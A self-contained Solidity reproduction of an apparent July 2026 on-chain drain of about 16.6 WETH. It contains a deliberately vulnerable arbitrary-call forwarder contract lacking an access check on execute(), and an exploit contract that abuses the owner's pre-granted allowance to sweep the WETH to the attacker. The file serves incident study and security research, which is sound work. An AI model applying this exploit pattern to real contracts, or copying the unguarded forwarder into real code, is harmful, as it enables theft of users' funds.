// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Self-contained reproduction of the UnprotectedArbBot drain (Base, 2026-07).
//
// ~16.623 WETH (~$31.7K) pulled from an owner EOA in a single tx. Basis:
// DeFiHackLabs PR #1209 (src/test/2026-07/UnprotectedArbBot_exp.sol). The victim
// 0xA31722…c170 is UNVERIFIED on-chain; this reproduces the OBSERVED BEHAVIOR
// faithfully (callTracer + receipt logs), not byte-verbatim source:
//   The victim exposes an unprotected selector (0x42be3129) that takes a
//   caller-supplied target + calldata, executes it via a low-level CALL, then
//   sweeps the named token's balance to msg.sender. A DIFFERENT selector IS
//   onlyOwner-gated — so the bug is a missing access-control check on the
//   arbitrary-call forwarder, not on the whole contract. The attacker made the
//   victim call WETH.transferFrom(owner, victim, 16.623 WETH) using an allowance
//   the owner had PRE-GRANTED the victim, then the same call swept that WETH to
//   the caller. No signature, no privileged role, no key compromise.
// Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
    function transferFrom(address from, address to, uint256 a) external returns (bool);
    function approve(address s, uint256 a) external returns (bool);
    function allowance(address o, address s) external view returns (uint256);
}

// Faithful WETH double (Base WETH, 18-dec).
contract WETH9 is IERC20 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

// The drained owner: a normal wallet that (as ordinary on-chain state) has
// pre-granted the bot an ERC20 allowance so the bot can move its WETH.
contract OwnerWallet {
    function approveToken(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE bot — an arbitrary-call forwarder with a missing access-control
// check on the forwarding entrypoint (behavior reconstructed from the trace).
// ─────────────────────────────────────────────────────────────────────────────
contract ArbBot {
    address public owner;
    constructor() { owner = msg.sender; }

    // A DIFFERENT entrypoint IS gated — proving the omission on execute() is the bug,
    // not an intentionally-open design.
    function privilegedSweep(address token, address to) external {
        require(msg.sender == owner, "not owner");
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    // @> VULN: no access control. Anyone can make the bot run an arbitrary call
    // (here WETH.transferFrom(owner, bot, amt) against a PRE-GRANTED allowance),
    // then the same call sweeps the token balance to msg.sender.
    function execute(address target, bytes calldata data, address token) external {
        (bool ok, ) = target.call(data); // @> VULN: attacker-supplied target+calldata executed with no caller check
        require(ok, "forwarded call failed");
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: drive the bot to pull the owner's pre-granted WETH and sweep
// it to the attacker.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    uint256 internal constant AMT = 16623029776956898128; // 16.623029776956898128 WETH

    WETH9 public weth;         // n1 (profit token)
    OwnerWallet public owner;  // n2
    ArbBot public bot;         // n3 (VULN)

    uint256 public drained;
    uint256 public profit;

    constructor() {
        weth = new WETH9();          // n1
        owner = new OwnerWallet();   // n2
        bot = new ArbBot();          // n3

        // The owner holds WETH and (ordinary on-chain state) pre-granted the bot an allowance.
        weth.mint(address(owner), AMT);
        owner.approveToken(address(weth), address(bot), type(uint256).max);
    }

    function run() external {
        uint256 before = weth.balanceOf(address(this));

        // Abuse the ungated forwarder: bot.execute makes the bot call
        // WETH.transferFrom(owner, bot, AMT) on the pre-granted allowance, then
        // sweeps the pulled WETH to us (msg.sender).
        bytes memory payload = abi.encodeWithSelector(IERC20.transferFrom.selector, address(owner), address(bot), AMT);
        bot.execute(address(weth), payload, address(weth));

        uint256 got = weth.balanceOf(address(this));
        drained = got - before;
        profit = drained;
        require(profit == AMT, "drain mismatch");
    }
}
